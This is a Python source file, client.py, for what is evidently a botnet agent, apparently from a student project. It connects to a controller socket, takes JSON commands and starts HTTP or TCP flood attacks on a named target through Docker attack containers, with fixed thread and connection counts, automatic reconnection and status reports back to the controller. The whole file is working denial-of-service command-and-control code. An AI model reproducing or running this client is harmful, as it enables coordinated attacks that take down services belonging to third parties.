# client.py
import socket
import subprocess
import signal
import time
import json
import shutil
import sys

CONTROLLER_HOST = "localhost"
CONTROLLER_PORT = 8545
RECONNECT_DELAY = 5

HTTP_THREADS = 6       # Fixed number of threads for HTTP attacks
HTTP_CONNECTIONS = 150 # Fixed number of connections for HTTP attacks
TCP_PARALLEL = 10 

ATTACK_CONTAINERS = {
    "http": "fyp/http-attacker",
    "tcp": "fyp/tcp-attacker"
}

def find_docker():
    docker_path = shutil.which("docker")
    if docker_path:
        return docker_path
    
    print("Docker not found. Please install Docker.")
    sys.exit(1)

def connect_to_controller():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((CONTROLLER_HOST, CONTROLLER_PORT))
            print(f"Connected to controller at {CONTROLLER_HOST}:{CONTROLLER_PORT}")
            return sock
        except ConnectionRefusedError:
            print(f"Retrying connection in {RECONNECT_DELAY} seconds...")
            time.sleep(RECONNECT_DELAY)
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(RECONNECT_DELAY)

def launch_http_attack(target, duration):
    docker_cmd = [
        find_docker(), "run", "--rm", "-d",
        "--network=host",  # Use host networking for direct access
        ATTACK_CONTAINERS["http"],
        "-t", str(HTTP_THREADS),
        "-c", str(HTTP_CONNECTIONS),
        "-d", str(duration),
        target
    ]
    
    try:
        output = subprocess.check_output(docker_cmd)
        container_id = output.decode('utf-8').strip()
        print(f"Started HTTP attack container: {container_id[:12]}")
        return container_id
    except subprocess.CalledProcessError as e:
        print(f"Failed to start HTTP attack: {e.output.decode('utf-8')}")
        return None

def launch_tcp_attack(target, duration):
    try:
        host, port = target.split(":")
    except ValueError:
        print(f"Invalid target format for TCP attack: {target}")
        return None
    
    docker_cmd = [
        find_docker(), "run", "--rm", "-d",
        "--network=host",  # Use host networking for direct access
        ATTACK_CONTAINERS["tcp"],
        "-t", str(duration),
        "-p", port,
        host
    ]
    
    try:
        output = subprocess.check_output(docker_cmd)
        container_id = output.decode('utf-8').strip()
        print(f"Started TCP attack container: {container_id[:12]}")
        return container_id
    except subprocess.CalledProcessError as e:
        print(f"Failed to start TCP attack: {e.output.decode('utf-8')}")
        return None

def stop_container(container_id):
    if not container_id:
        return
    
    try:
        subprocess.run([find_docker(), "stop", container_id], check=True)
        print(f"Stopped container: {container_id[:12]}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to stop container: {e}")

def main():
    current_container = None
    sock = None
    
    def signal_handler(sig, frame):
        print("\nShutting down client...")
        if current_container:
            stop_container(current_container)
        if sock:
            sock.close()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    while True:
        try:
            if not sock:
                sock = connect_to_controller()
            
            data = sock.recv(4096).decode('utf-8').strip()
            if not data:
                print("Connection closed by controller")
                sock.close()
                sock = None
                time.sleep(RECONNECT_DELAY)
                continue
            
            try:
                command = json.loads(data)
                print(f"Received command: {command}")
                
                if current_container:
                    stop_container(current_container)
                    current_container = None
                
                cmd_type = command.get("type")
                
                if cmd_type == "attack":
                    attack_type = command.get("attack_type")
                    duration = command.get("duration", 60)
                    target = command.get("target")
                    
                    if not target:
                        print("Error: No target specified")
                        continue
                    
                    if attack_type == "http":
                        current_container = launch_http_attack(target, duration)
                    elif attack_type == "tcp":
                        current_container = launch_tcp_attack(target, duration)
                    else:
                        print(f"Unknown attack type: {attack_type}")
                        
                    if current_container:
                        status = {
                            "type": "status",
                            "status": "attack_started",
                            "attack_type": attack_type,
                            "container_id": current_container
                        }
                        sock.sendall(json.dumps(status).encode('utf-8'))
                
                elif cmd_type == "stop":
                    if current_container:
                        stop_container(current_container)
                        current_container = None
                    
                    status = {
                        "type": "status",
                        "status": "stopped"
                    }
                    sock.sendall(json.dumps(status).encode('utf-8'))
                
                elif cmd_type == "ping":
                    sock.sendall(json.dumps({"type": "pong"}).encode('utf-8'))
                
            except json.JSONDecodeError:
                print(f"Invalid JSON received: {data}")
        
        except socket.error as e:
            print(f"Socket error: {e}")
            if sock:
                sock.close()
                sock = None
            time.sleep(RECONNECT_DELAY)
        
        except Exception as e:
            print(f"Unexpected error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()